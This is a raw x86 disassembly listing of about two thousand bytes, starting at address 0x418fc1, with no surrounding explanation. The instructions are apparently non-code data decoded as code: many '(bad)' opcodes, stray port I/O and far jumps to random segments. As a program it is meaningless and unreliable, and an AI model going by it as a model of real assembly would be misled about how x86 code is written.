  418fc1:	aas    
  418fc2:	or     eax,0x82bb3aa
  418fc7:	cdq    
  418fc8:	pop    ebx
  418fc9:	push   cs
  418fca:	xor    DWORD PTR [ebp-0x273739c2],esp
  418fd0:	pop    ecx
  418fd1:	jmp    0x41904a
  418fd3:	push   eax
  418fd4:	mov    edx,0xfa60311e
  418fd9:	adc    ecx,DWORD PTR [edi+0x1267180b]
  418fdf:	cmp    eax,0x38224914
  418fe4:	(bad)  
  418fe5:	or     eax,0xf6b79374
  418fea:	sbb    edi,DWORD PTR [ebx-0x21]
  418fed:	and    al,0x59
  418fef:	push   cs
  418ff0:	addr16 fdiv st(5),st
  418ff3:	jne    0x418f80
  418ff5:	mov    dh,0x1a
  418ff7:	sub    DWORD PTR [edi-0x2e],edi
  418ffa:	rcl    al,1
  418ffc:	mov    WORD PTR [esi-0x8],ss
  418fff:	push   cs
  419000:	sbb    eax,0x7a5b6149
  419005:	cmp    eax,0xe4bade8d
  41900a:	stos   DWORD PTR es:[edi],eax
  41900b:	pop    esi
  41900c:	in     al,dx
  41900d:	mov    dh,0x61
  41900f:	xor    ah,BYTE PTR [edi-0x11]
  419012:	fld    DWORD PTR [ebx+0x2d64cf41]
  419018:	dec    esp
  419019:	scas   al,BYTE PTR es:[edi]
  41901a:	outs   dx,DWORD PTR gs:[esi]
  41901c:	int3   
  41901d:	xchg   esi,eax
  41901e:	arpl   WORD PTR [ebp-0x64],bx
  419021:	imul   DWORD PTR [ebx-0x24b00774]
  419027:	or     eax,0x4f227f7
  41902c:	test   al,0x6a
  41902e:	in     eax,dx
  41902f:	(bad)
  419034:	mov    ah,0x4e
  419036:	cmp    DWORD PTR [edi],ebp
  419038:	or     edi,ecx
  41903a:	adc    ecx,DWORD PTR [ebx-0xae2958d]
  419040:	push   ds
  419041:	data16 gs stc 
  419044:	add    eax,0x2a3350af
  419049:	loope  0x418ff0
  41904b:	cwde   
  41904c:	push   cs
  41904d:	lea    ebx,ds:0x50a5b890
  419053:	xlat   BYTE PTR ds:[ebx]
  419054:	and    esp,DWORD PTR [ebx+0x47]
  419057:	lock fidiv WORD PTR [ebx+0x54]
  41905b:	sbb    ah,BYTE PTR [ecx+eax*4-0x65]
  41905f:	xlat   BYTE PTR ds:[ebx]
  419060:	ficom  WORD PTR [ebp-0xc]
  419063:	sti    
  419064:	fcmovu st,st(2)
  419066:	(bad)  
  419068:	mov    bl,0xbe
  41906a:	stos   DWORD PTR es:[edi],eax
  41906b:	ja     0x41906c
  41906d:	fimul  DWORD PTR [edx]
  41906f:	into   
  419070:	and    DWORD PTR [esi-0x5c],ebx
  419073:	das    
  419074:	rcl    ch,0x6d
  419077:	dec    edi
  419078:	pmaxsw mm6,QWORD PTR [ebp-0xc]
  41907c:	(bad)  
  41907d:	pushf  
  41907e:	repz mov edi,0x58d17398
  419084:	mov    esp,0xfa78fa37
  419089:	icebp  
  41908a:	das    
  41908b:	xchg   ebx,eax
  41908c:	cld    
  41908d:	arpl   dx,cx
  41908f:	sub    al,0xd6
  419091:	(bad)  
  419092:	leave  
  419093:	daa    
  419094:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419095:	or     DWORD PTR [eax-0x265fa226],edx
  41909b:	enter  0x7881,0xe3
  41909f:	cld    
  4190a0:	mov    dl,0xf0
  4190a2:	mov    ss,ebx
  4190a4:	fimul  DWORD PTR [edx+0x72]
  4190a7:	cwde   
  4190a8:	cmp    ch,BYTE PTR [esi+eax*2-0x5ec776c3]
  4190af:	sbb    BYTE PTR [esi-0x34c4c071],dh
  4190b5:	xor    DWORD PTR [eax-0x28782652],ecx
  4190bb:	hlt    
  4190bc:	jns    0x4190bd
  4190be:	xchg   ebp,eax
  4190bf:	mov    al,0xf2
  4190c1:	out    0x42,al
  4190c3:	xchg   esi,eax
  4190c4:	fsubp  st(6),st
  4190c6:	mov    al,ds:0xb3bb6f77
  4190cb:	clc    
  4190cc:	clc    
  4190cd:	cmc    
  4190ce:	mov    ebp,0x3aba06e7
  4190d3:	je     0x4190b1
  4190d5:	ret    
  4190d6:	push   ebx
  4190d7:	imul   ecx,DWORD PTR [edi],0xc2c6f567
  4190dd:	arpl   WORD PTR [eax-0x7573823d],sp
  4190e3:	gs leave 
  4190e5:	push   0xc8e5880e
  4190ea:	xor    bl,ah
  4190ec:	js     0x419076
  4190ee:	xor    al,0x97
  4190f0:	fidiv  WORD PTR [eax]
  4190f2:	cld    
  4190f3:	sub    dh,ch
  4190f5:	jle    0x41911c
  4190f7:	adc    ebp,DWORD PTR [edi+0x71]
  4190fa:	imul   ecx,DWORD PTR [eax-0x6a],0x8cf0ccf9
  419101:	(bad)  
  419102:	jo     0x419107
  419104:	jae    0x419146
  419106:	inc    cx
  419108:	(bad)  [ecx+eiz*8-0x79]
  41910c:	lods   al,BYTE PTR ds:[esi]
  41910d:	add    al,0x31
  41910f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419110:	sub    DWORD PTR [edx+edi*1],ecx
  419113:	les    ebx,FWORD PTR [edx]
  419115:	retf   0x91b1
  419118:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419119:	or     eax,0x374abbe9
  41911e:	stos   DWORD PTR es:[edi],eax
  41911f:	sub    al,0xfd
  419121:	mov    ecx,0xe05edc61
  419126:	shr    BYTE PTR [ecx],0x45
  419129:	jmp    0x41919a
  41912b:	mov    BYTE PTR [ecx-0x2bcbb945],al
  419131:	les    ebp,FWORD PTR [ebx-0x4d884d4c]
  419137:	xor    eax,0x40ffb195
  41913c:	fnstcw WORD PTR [eax+0x19]
  41913f:	retf   0xf26
  419142:	pop    ebx
  419143:	(bad)  
  419144:	jmp    0x419162
  419146:	jnp    0x41919d
  419148:	jbe    0x41910e
  41914a:	sbb    BYTE PTR [ecx-0x45],dl
  41914d:	lahf   
  41914e:	dec    ebp
  41914f:	gs pop ds
  419151:	rol    bl,cl
  419153:	dec    edx
  419154:	dec    edx
  419155:	nop
  419156:	and    al,0xa3
  419158:	lsl    eax,bx
  41915b:	cs clc 
  41915d:	imul   eax,DWORD PTR [esi],0xda4aad9
  419163:	repnz imul ebx,DWORD PTR [eax-0xf0903b],0xd09b2ec7
  41916e:	sub    cl,BYTE PTR [edx]
  419170:	and    eax,0xa02ed1c7
  419175:	mov    edi,0xb37b472d
  41917a:	(bad)  
  41917b:	(bad)  
  41917c:	push   cs
  41917d:	add    al,0xfc
  41917f:	fwait
  419180:	adc    bl,bh
  419182:	int3   
  419183:	xor    BYTE PTR [eax],ah
  419185:	jl     0x4191d5
  419187:	ins    DWORD PTR es:[edi],dx
  419188:	dec    ecx
  419189:	fcom   DWORD PTR [eax+ebx*4+0x6c]
  41918d:	out    dx,eax
  41918e:	mov    ebp,0x4553b6f0
  419193:	lods   al,BYTE PTR ds:[esi]
  419194:	int3   
  419195:	sub    al,0x80
  419197:	outs   dx,BYTE PTR ds:[esi]
  419198:	mov    esp,0xa373492b
  41919d:	pop    esi
  41919e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41919f:	fcom   QWORD PTR [eax-0x1ec500dc]
  4191a5:	push   ss
  4191a6:	arpl   WORD PTR [ebp+esi*2+0x2d],ax
  4191aa:	test   BYTE PTR [ebp+ebp*2-0x44],cl
  4191ae:	loop   0x41918e
  4191b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4191b1:	cli    
  4191b2:	aad    0x7a
  4191b4:	jl     0x419232
  4191b6:	inc    edx
  4191b7:	call   0x87e3:0x7280c7e4
  4191be:	sbb    esp,ecx
  4191c0:	les    edx,FWORD PTR [edi+0x47]
  4191c3:	add    al,0x7a
  4191c5:	mov    al,ds:0xa0c46416
  4191ca:	imul   BYTE PTR ss:[ecx+0x5ab062f8]
  4191d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4191d2:	and    BYTE PTR [eax+0x2d],ch
  4191d5:	mov    edx,0xb3b23431
  4191da:	mov    al,ds:0x4a8670dc
  4191df:	stc    
  4191e0:	fld    TBYTE PTR [eax+0x1e]
  4191e3:	fwait
  4191e4:	loope  0x4191d9
  4191e6:	jecxz  0x419219
  4191e8:	leave  
  4191e9:	and    ebx,DWORD PTR [ebx+0x25179319]
  4191ef:	je     0x4191b9
  4191f1:	test   BYTE PTR [ebp+0xf19690f],dh
  4191f7:	sub    ah,al
  4191f9:	or     al,0xf1
  4191fb:	out    0x6e,eax
  4191fd:	adc    ch,al
  4191ff:	push   ds
  419200:	sbb    BYTE PTR ds:0xf3e21560,cl
  419206:	stos   BYTE PTR es:[edi],al
  419207:	lahf   
  419208:	mov    edx,0x7e746cdc
  41920d:	stc    
  41920e:	es mov esi,0x37c4995
  419214:	sbb    DWORD PTR [ecx-0x53],esi
  419217:	idiv   DWORD PTR [edx]
  419219:	adc    eax,0x8c7a25b5
  41921e:	in     al,0x4d
  419220:	sub    BYTE PTR [ecx-0x34],dl
  419223:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419224:	push   ebx
  419225:	xor    edx,DWORD PTR [ecx+0x77]
  419228:	jp     0x419213
  41922a:	dec    ebp
  41922b:	mov    al,BYTE PTR [edi+0x13c941eb]
  419231:	add    al,0x5f
  419233:	loopne 0x419224
  419235:	xor    al,0x6b
  419237:	push   ecx
  419238:	mov    dl,0x30
  41923a:	int    0x44
  41923c:	mov    edx,0x355d7874
  419241:	mov    ecx,0xa0bd5b35
  419246:	out    dx,al
  419247:	test   BYTE PTR [ecx],dl
  419249:	mov    WORD PTR gs:[ebx+0x8],di
  41924e:	fcomp  QWORD PTR gs:[esi-0x1df306c3]
  419255:	leave  
  419256:	or     al,0xe9
  419258:	adc    DWORD PTR [ebx],0x270f3d6f
  41925e:	nop
  41925f:	xchg   DWORD PTR [esi+edx*2],esi
  419262:	in     al,0x60
  419264:	xchg   esp,eax
  419265:	pop    edx
  419266:	data16 fisttp QWORD PTR [ecx+0x1e8230dd]
  41926d:	out    dx,al
  41926e:	in     eax,0x9c
  419270:	sahf   
  419271:	loopne 0x4191f7
  419273:	mov    dl,0x66
  419275:	or     dh,ch
  419277:	lods   eax,DWORD PTR ds:[esi]
  419278:	and    al,0x0
  41927a:	test   al,0xa2
  41927c:	test   BYTE PTR [ebx],0xe9
  41927f:	push   es
  419280:	mov    ds:0xe4155086,eax
  419285:	jns    0x419242
  419287:	je     0x4192cb
  419289:	data16 and dl,BYTE PTR [edi+0x4d633796]
  419290:	and    al,0xf8
  419292:	scas   al,BYTE PTR es:[edi]
  419293:	xchg   edx,esp
  419295:	pcmpgtd mm7,QWORD PTR [eax+0x48]
  419299:	fist   WORD PTR [edi]
  41929b:	outs   dx,DWORD PTR ds:[esi]
  41929c:	enter  0x2364,0x74
  4192a0:	inc    esp
  4192a1:	in     eax,0x8
  4192a3:	neg    BYTE PTR [ecx+ebp*1-0x4f74746]
  4192aa:	mov    edi,0xd3c03660
  4192af:	sub    eax,0x5db5eb59
  4192b4:	ror    DWORD PTR [eax+0x1c],0x54
  4192b8:	lock mov ebp,0x4b6ca5da
  4192be:	xchg   edx,eax
  4192bf:	push   edx
  4192c0:	dec    ecx
  4192c1:	not    DWORD PTR [ebx-0xc]
  4192c4:	outs   dx,DWORD PTR ds:[esi]
  4192c5:	popf   
  4192c6:	sub    bl,al
  4192c8:	sahf   
  4192c9:	imul   eax,DWORD PTR [edi+0x35ae278a],0x14f53d92
  4192d3:	add    edx,DWORD PTR [edx-0x62a52c60]
  4192d9:	pop    ss
  4192da:	push   esp
  4192db:	(bad)  
  4192dd:	and    DWORD PTR [edi-0x427d8b59],0x24
  4192e4:	aam    0x69
  4192e6:	jno    0x4192de
  4192e8:	daa    
  4192e9:	pushf  
  4192ea:	pushf  
  4192eb:	imul   eax,DWORD PTR [edi],0x1b340559
  4192f1:	imul   ebp,DWORD PTR [eax+0x6e],0x94893bf
  4192f8:	stc    
  4192f9:	jo     0x4192ac
  4192fb:	(bad)  
  4192fc:	outs   dx,BYTE PTR ds:[esi]
  4192fd:	sub    al,0x12
  4192ff:	rol    BYTE PTR [edi],cl
  419301:	pushf  
  419302:	and    eax,0x68aa4b39
  419307:	js     0x419386
  419309:	xchg   ebx,eax
  41930a:	pop    ds
  41930b:	cli    
  41930c:	add    ebx,edx
  41930e:	sub    BYTE PTR [eax],bl
  419310:	rcr    BYTE PTR [edi-0x41],0xaa
  419314:	jbe    0x4192b1
  419316:	scas   al,BYTE PTR es:[edi]
  419317:	mov    edi,0x42b908ef
  41931c:	or     bl,BYTE PTR [ebx+0x3e]
  41931f:	and    al,0xdd
  419321:	push   ss
  419322:	xchg   edx,eax
  419323:	imul   ebx,DWORD PTR [esi+0x3dcaa905],0x6e
  41932a:	cdq    
  41932b:	cld    
  41932c:	mov    ebx,0x4e6a892
  419331:	call   DWORD PTR [ebp+0x61]
  419334:	add    DWORD PTR [ebp+0x4e],esi
  419337:	and    BYTE PTR [ebx+ebp*4],0xe7
  41933b:	xchg   esi,eax
  41933c:	jg     0x4192cf
  41933e:	fsubr  st(2),st
  419340:	cdq    
  419341:	sti    
  419342:	jl     0x419372
  419344:	gs push eax
  419346:	fldenv [ebp+0x29]
  419349:	push   edi
  41934a:	push   cs
  41934b:	sbb    eax,0x2630380b
  419350:	mov    dl,0x18
  419352:	lods   al,BYTE PTR ds:[esi]
  419353:	push   ss
  419354:	inc    ebx
  419355:	cwde   
  419356:	xchg   esp,eax
  419357:	mov    ah,0x7c
  419359:	inc    eax
  41935a:	xor    al,BYTE PTR [edi]
  41935c:	aaa    
  41935d:	in     al,0xbf
  41935f:	sub    al,0x4a
  419361:	mov    esp,0x9a058cb6
  419366:	mov    eax,0x10367bdd
  41936b:	or     ax,0xaf5f
  41936f:	clc    
  419370:	popa   
  419371:	(bad)  
  419373:	cmp    ch,BYTE PTR [esi-0x32]
  419376:	dec    ecx
  419377:	xor    al,0x2f
  419379:	dec    ecx
  41937a:	fwait
  41937b:	xchg   esi,eax
  41937c:	or     esp,DWORD PTR [edi+eiz*8]
  41937f:	mov    ebx,0x3f88b264
  419384:	(bad)  
  419385:	call   0x98a69a78
  41938a:	pop    edx
  41938b:	xchg   DWORD PTR [ecx],eax
  41938d:	test   al,0x93
  41938f:	sar    BYTE PTR [edx+0x6f],cl
  419392:	call   0x76b4997
  419397:	imul   edi,DWORD PTR [eax+edx*1],0x22
  41939b:	mov    edx,0xd1b16647
  4193a0:	addr16 push esp
  4193a2:	pushf  
  4193a3:	fimul  DWORD PTR ds:0x318feb11
  4193a9:	inc    edi
  4193aa:	or     bh,BYTE PTR [edx-0x291aacc3]
  4193b0:	test   al,0xeb
  4193b2:	pushf  
  4193b3:	and    DWORD PTR [ecx-0x5a],eax
  4193b6:	cli    
  4193b7:	arpl   bp,di
  4193b9:	add    ah,cl
  4193bb:	xor    DWORD PTR [edi+0x6db5d286],esp
  4193c1:	ret    0x1678
  4193c4:	call   0x378e:0x8584d883
  4193cb:	(bad)  
  4193cc:	aad    0x8
  4193ce:	sar    BYTE PTR [eax-0x14],0xd2
  4193d2:	ins    DWORD PTR es:[edi],dx
  4193d3:	bound  ecx,QWORD PTR [esi]
  4193d5:	not    DWORD PTR [edi-0x15ee708c]
  4193db:	push   ss
  4193dc:	cld    
  4193dd:	push   ebp
  4193de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193df:	push   ecx
  4193e0:	jo     0x4193e0
  4193e2:	sbb    BYTE PTR [esi-0x54d5a13],0xf
  4193e9:	lahf   
  4193ea:	sbb    al,0x44
  4193ec:	lock push 0x47086e49
  4193f2:	adc    eax,0x620fea0b
  4193f7:	xor    al,0x6
  4193f9:	push   ecx
  4193fa:	push   esp
  4193fb:	enter  0x85d7,0x24
  4193ff:	cmp    eax,0x17ee0331
  419404:	out    0x74,eax
  419406:	jmp    0x8759:0x8ec3429f
  41940d:	scas   al,BYTE PTR es:[edi]
  41940e:	test   al,0x4a
  419410:	or     ah,0x5f
  419413:	cmp    ebx,DWORD PTR [edi-0xf19b50e]
  419419:	adc    al,0x95
  41941c:	mov    esi,0x9df4930f
  419421:	push   esp
  419422:	int    0x49
  419424:	jnp    0x419426
  419426:	scas   eax,DWORD PTR es:[edi]
  419427:	rcl    dl,0x41
  41942a:	mov    eax,ds:0x191288
  41942f:	push   ds
  419430:	cmp    al,BYTE PTR [ebx-0x1dda6d3f]
  419436:	sbb    al,0x66
  419438:	adc    ebp,DWORD PTR [ecx-0x2c]
  41943b:	push   ss
  41943c:	fist   DWORD PTR [ebp+0x6c]
  41943f:	fnsave [ebp-0x7f]
  419442:	pop    ebp
  419443:	ret    0xef1d
  419446:	sub    al,0x1b
  419448:	push   ebx
  419449:	cmp    al,0x52
  41944b:	xor    eax,DWORD PTR [ebp-0x51512b68]
  419451:	outs   dx,DWORD PTR ds:[esi]
  419452:	popf   
  419453:	fs inc ebx
  419455:	test   eax,ebx
  419457:	mov    ch,0x57
  419459:	and    al,0xe5
  41945b:	in     al,0xd6
  41945d:	pop    edi
  41945e:	aam    0x2f
  419460:	push   esp
  419461:	jmp    0x1d0e:0x7deb72c1
  419468:	stos   DWORD PTR es:[edi],eax
  419469:	xchg   ecx,eax
  41946a:	lea    edi,[ecx-0x280e81d8]
  419470:	lahf   
  419471:	xor    eax,DWORD PTR [edi]
  419473:	aad    0xcb
  419475:	and    ebp,edi
  419477:	outs   dx,BYTE PTR ds:[esi]
  419478:	data16 mov cl,BYTE PTR [ecx]
  41947b:	and    al,0x31
  41947d:	push   ss
  41947e:	push   edx
  41947f:	popf   
  419480:	xlat   BYTE PTR ds:[ebx]
  419481:	retf   0x842e
  419484:	add    al,BYTE PTR ds:0xb0b67edf
  41948a:	ret    
  41948b:	ret    
  41948c:	xchg   ebp,eax
  41948d:	mov    ebp,0x91decc5f
  419492:	adc    ecx,DWORD PTR [edx]
  419494:	fnstcw WORD PTR [edi+ebp*1+0x59]
  419498:	or     BYTE PTR [esi],dl
  41949a:	mov    ebx,0x119c23c2
  41949f:	retf   0x36c2
  4194a2:	sub    al,0x91
  4194a4:	addr16 leave 
  4194a6:	push   0xffffffbf
  4194a8:	test   eax,0x1fd0e7db
  4194ad:	jge    0x4194e3
  4194af:	inc    esp
  4194b0:	fwait
  4194b1:	xchg   esi,eax
  4194b2:	out    dx,ax
  4194b4:	and    eax,0xab7710d7
  4194b9:	pop    edx
  4194ba:	(bad)
  4194bd:	dec    edi
  4194be:	pop    eax
  4194bf:	out    dx,al
  4194c0:	lahf   
  4194c1:	dec    esi
  4194c2:	mov    DWORD PTR [esp+edx*8+0x5ddee2fa],ecx
  4194c9:	mov    ecx,0x191700ff
  4194ce:	push   ss
  4194cf:	and    al,0xa3
  4194d1:	ror    cl,cl
  4194d3:	pop    edx
  4194d4:	dec    edi
  4194d5:	imul   ecx,DWORD PTR [eax-0x5a],0xffffffeb
  4194d9:	cdq    
  4194da:	and    DWORD PTR [ebp+0x2f3bc088],ecx
  4194e0:	mov    dh,BYTE PTR [esi]
  4194e2:	sbb    eax,0x18aa59be
  4194e7:	add    al,BYTE PTR [eax+0xd]
  4194ea:	rol    BYTE PTR [ebp+0x34a3573c],0xb7
  4194f1:	out    0x4c,al
  4194f3:	sub    eax,edx
  4194f5:	xchg   edx,eax
  4194f6:	fdiv   st(1),st
  4194f8:	fcmove st,st(7)
  4194fa:	push   esp
  4194fb:	jmp    FWORD PTR [ebp+ebp*1-0x41]
  4194ff:	fistp  WORD PTR cs:[esi-0x669c4e9]
  419506:	arpl   WORD PTR [ebp+0x2567ff28],dx
  41950c:	(bad)  
  41950d:	mov    bh,0xdd
  41950f:	xor    edi,DWORD PTR [edx-0x80]
  419512:	xor    BYTE PTR [bp+di+0x1a],cl
  419516:	sub    al,0x1b
  419518:	sbb    cl,BYTE PTR [edx-0xd761ea5]
  41951e:	inc    esi
  41951f:	add    al,BYTE PTR ds:0xfdbe450
  419525:	pop    ecx
  419526:	fild   DWORD PTR [esi]
  419528:	aaa    
  419529:	bound  esi,QWORD PTR [edi]
  41952b:	ds ja  0x4195a2
  41952e:	mov    edx,0xbc570661
  419533:	jl     0x41958f
  419535:	add    BYTE PTR [ebx-0x32d9444e],0xb
  41953c:	sub    eax,ecx
  41953e:	shl    BYTE PTR [esi+edx*8],0x64
  419542:	xchg   esp,eax
  419543:	aam    0xc
  419545:	dec    edx
  419546:	jmp    0xe513:0xf2503cde
  41954d:	mov    bh,0xb2
  41954f:	jno    0x419544
  419551:	push   ebp
  419552:	test   al,0x59
  419554:	inc    ebp
  419555:	(bad)  
  419556:	xchg   ebp,eax
  419557:	sub    DWORD PTR [esi-0x1f],ecx
  41955a:	add    cl,BYTE PTR [ebx-0x15b87bde]
  419560:	jne    0x41954f
  419562:	not    BYTE PTR [ebx+ecx*4+0x21]
  419566:	jb     0x4194fe
  419568:	xchg   ch,ch
  41956a:	push   ecx
  41956b:	into   
  41956c:	sti    
  41956d:	mov    edx,0x4ead948e
  419572:	out    dx,al
  419573:	xchg   esi,eax
  419574:	push   esp
  419575:	(bad)  
  419576:	das    
  419577:	repz jae 0x419542
  41957a:	mov    eax,0x228ef740
  41957f:	jmp    0x515fed34
  419584:	adc    eax,0x70915279
  419589:	jge    0x4195dc
  41958b:	int    0xc7
  41958d:	jnp    0x4195d0
  41958f:	xchg   esp,eax
  419590:	mov    ecx,0x2f03ed36
  419595:	pop    eax
  419596:	jnp    0x419609
  419598:	jbe    0x419614
  41959a:	in     eax,0xe1
  41959c:	dec    edx
  41959d:	push   ss
  41959e:	jmp    0x4195ec
  4195a0:	jmp    0x1425ae44
  4195a5:	cmp    edx,DWORD PTR [ebp+0x44f738f1]
  4195ab:	lea    esi,[esi+0x5e1bef68]
  4195b1:	mov    al,0x24
  4195b3:	inc    edx
  4195b4:	push   0xffffff94
  4195b6:	ds inc ebx
  4195b8:	mov    BYTE PTR [ebx+0x19],bh
  4195bb:	retf   0x1aa5
  4195be:	ds mov esi,0xa8f7719c
  4195c4:	pop    eax
  4195c5:	imul   esp,DWORD PTR [ebp+0x358963fd],0xfffffffd
  4195cc:	mov    ebp,0x24e2f847
  4195d1:	add    cl,0xd9
  4195d4:	enter  0x9a18,0xe5
  4195d8:	sbb    ebx,DWORD PTR [eax-0x55]
  4195db:	neg    BYTE PTR [ebx+edi*2+0x584fd486]
  4195e2:	daa    
  4195e3:	dec    ebp
  4195e4:	pop    ecx
  4195e5:	stc    
  4195e6:	out    dx,eax
  4195e7:	out    dx,eax
  4195e8:	fst    QWORD PTR [edx+0x32963304]
  4195ee:	scas   eax,DWORD PTR es:[edi]
  4195ef:	mov    cl,0x3
  4195f1:	jb     0x419610
  4195f3:	and    ebx,esi
  4195f5:	(bad)  [edi-0x75e422a3]
  4195fb:	stos   BYTE PTR es:[edi],al
  4195fc:	test   eax,0xea051f1d
  419601:	xchg   ecx,eax
  419602:	push   edi
  419603:	(bad)  
  419604:	inc    esp
  419605:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419606:	daa    
  419607:	pop    edi
  419608:	inc    ebp
  419609:	cld    
  41960a:	cmp    ebx,eax
  41960c:	int3   
  41960d:	jp     0x41964a
  41960f:	shl    dl,0xfe
  419612:	frstorw [ebp-0x6843fc1f]
  419619:	fmul   DWORD PTR [edi+0x1a]
  41961c:	div    BYTE PTR [esi+0x54dc2748]
  419622:	jne    0x4195e4
  419624:	add    edi,DWORD PTR [ebp+esi*1-0x6d]
  419628:	bound  eax,QWORD PTR [esi-0x61ba39f9]
  41962e:	xchg   ebp,eax
  41962f:	pop    ecx
  419630:	sub    al,0xea
  419632:	call   0x5ed8:0x8529d973
  419639:	ficomp WORD PTR [esi]
  41963b:	stc    
  41963c:	fisttp DWORD PTR [edx-0x53f10d26]
  419642:	mov    ebx,0x88769f6d
  419647:	in     al,dx
  419648:	or     esi,DWORD PTR [edx]
  41964a:	jmp    FWORD PTR [eax+eiz*2]
  41964d:	xor    al,0x19
  41964f:	xor    cx,WORD PTR ds:0x377dffb5
  419656:	cdq    
  419657:	pusha  
  419658:	in     eax,0x5a
  41965a:	fdivr  st,st(1)
  41965c:	dec    eax
  41965d:	mov    eax,ds:0x2ce974fa
  419662:	mov    BYTE PTR [ebx+0x5b],bl
  419665:	(bad)  
  419666:	cmp    al,BYTE PTR [ecx-0x64a1ed27]
  41966c:	dec    ebx
  41966d:	pop    edx
  41966e:	(bad)  
  419670:	jnp    0x4196aa
  419672:	jp     0x4196e5
  419674:	retf   0xbec0
  419677:	retf   0xeec8
  41967a:	iret   
  41967b:	cwde   
  41967c:	(bad)  
  41967d:	aad    0x27
  41967f:	test   al,0xa0
  419681:	es ins DWORD PTR es:[edi],dx
  419683:	and    cl,BYTE PTR [esi-0x40]
  419686:	cmp    DWORD PTR [eax-0x63226327],edi
  41968c:	inc    ecx
  41968d:	jmp    0x2775:0xace9ee57
  419694:	cmp    DWORD PTR [esi],ebx
  419696:	test   al,0x3e
  419698:	mov    esp,0xbbdbb2fd
  41969d:	sub    bh,0xa7
  4196a0:	jg     0x4196d8
  4196a2:	push   0xffffffb2
  4196a4:	jno    0x4196b9
  4196a6:	mov    bh,0x70
  4196a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196a9:	sub    eax,0xee557ceb
  4196ae:	lds    edx,FWORD PTR [ecx+0x55]
  4196b1:	push   es
  4196b2:	inc    ebx
  4196b3:	stos   DWORD PTR es:[edi],eax
  4196b4:	(bad)  
  4196b5:	dec    esp
  4196b6:	xchg   ebp,eax
  4196b7:	dec    ebp
  4196b8:	ds cmc 
  4196ba:	xor    eax,0x2e75c0a0
  4196bf:	inc    edx
  4196c0:	push   ebp
  4196c1:	shl    DWORD PTR [ebx],1
  4196c3:	sub    al,0x79
  4196c5:	ror    ebx,1
  4196c7:	push   es
  4196c8:	idiv   edi
  4196ca:	xchg   esi,eax
  4196cb:	mov    edx,0xbb6a8b9b
  4196d0:	idiv   eax
  4196d2:	mov    ch,0x2a
  4196d4:	rcr    BYTE PTR [ebx-0x51d8682a],1
  4196da:	leave  
  4196db:	jecxz  0x419688
  4196dd:	mov    dh,0xcc
  4196df:	jle    0x419699
  4196e1:	aam    0x25
  4196e3:	sbb    edx,DWORD PTR [edx]
  4196e5:	mov    dh,0xbf
  4196e7:	rcl    BYTE PTR [edx],cl
  4196e9:	cmp    DWORD PTR [ebp+ecx*2+0x72],0x16
  4196ee:	rol    ebp,1
  4196f0:	stos   DWORD PTR es:[edi],eax
  4196f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196f2:	lahf   
  4196f3:	(bad)
  4196f6:	jecxz  0x4196b3
  4196f8:	nop
  4196f9:	cli    
  4196fa:	int    0x9b
  4196fc:	jnp    0x4196f8
  4196fe:	in     al,dx
  4196ff:	jg     0x4196b2
  419701:	aam    0x13
  419703:	fcom   DWORD PTR [ebp+0xb]
  419706:	and    DWORD PTR [esi],ebp
  419708:	popf   
  419709:	push   ss
  41970a:	rcr    cl,cl
  41970c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41970d:	(bad)
  419712:	iret   
  419713:	mov    ah,0xb8
  419715:	dec    eax
  419716:	push   ebx
  419717:	jmp    0xac97:0x6a214126
  41971e:	int    0x6e
  419720:	mov    ch,dh
  419722:	fs sahf 
  419724:	mov    bh,0x38
  419726:	ret    
  419727:	dec    esi
  419728:	lods   al,BYTE PTR ds:[esi]
  419729:	enter  0xb2b1,0x42
  41972d:	push   edi
  41972e:	rol    esp,1
  419730:	push   esp
  419731:	pop    esp
  419732:	and    BYTE PTR [ebx],0x79
  419735:	mov    dl,0x4d
  419737:	dec    ebp
  419738:	mul    DWORD PTR [esi-0x67655aaf]
  41973e:	(bad)  
  41973f:	add    al,0x8a
  419741:	enter  0x4bb,0x69
  419745:	call   0xc35:0xe1aa9877
  41974c:	sbb    dl,cl
  41974e:	popf   
  41974f:	xchg   ebp,eax
  419750:	gs stos BYTE PTR es:[edi],al
  419752:	retf   0x554
  419755:	loope  0x41978d
  419757:	fs mov bl,0xdc
  41975a:	ret    
  41975b:	mov    dh,0x29
  41975d:	inc    ebp
  41975e:	sahf   
  41975f:	mov    bh,0xbe
  419761:	js     0x419743
  419763:	xor    eax,0xd13a0e68
  419768:	arpl   WORD PTR [esi+0x7a1ce7a6],dx
  41976e:	jl     0x4197b2
  419770:	adc    BYTE PTR [edx],ah
  419772:	dec    eax
  419773:	lahf   
  419774:	fwait
  419775:	pop    ebx
  419776:	mov    al,ds:0x6fa1a0f3
  41977b:	cmp    al,BYTE PTR [ecx]
  41977d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41977e:	pop    ss
  41977f:	in     al,dx
  419780:	out    0xbe,al
  419782:	out    dx,eax
  419783:	adc    esi,ecx
  419785:	lods   al,BYTE PTR ds:[esi]
  419786:	in     eax,0xf2
  419788:	jo     0x41975a
  41978a:	pushf  
  41978b:	icebp  
  41978c:	pop    ebp
  41978d:	mov    esi,0xdd8d40be
  419792:	aas    
  419793:	mov    DWORD PTR [ebx+0x175b3dd3],eax
  419799:	mov    ah,0x1c
  41979b:	xor    ebp,DWORD PTR [edx+ecx*1-0x1ef1d348]
  4197a2:	cmp    ah,BYTE PTR [esi+0x7126f74e]
  4197a8:	out    0x2a,eax
  4197aa:	aad    0xbb
  4197ac:	inc    esp
  4197ad:	data16 (bad) 
  4197b0:	add    eax,0x14e768ea
  4197b5:	ins    BYTE PTR es:[edi],dx
  4197b6:	push   cs
  4197b7:	int3   
  4197b8:	mov    eax,ds:0xd95b5b3c
  4197bd:	dec    esi
  4197be:	clc    
  4197bf:	and    bl,bh
  4197c1:	xlat   BYTE PTR ds:[ebx]
  4197c2:	sbb    esi,DWORD PTR [eax-0x6c57cac9]
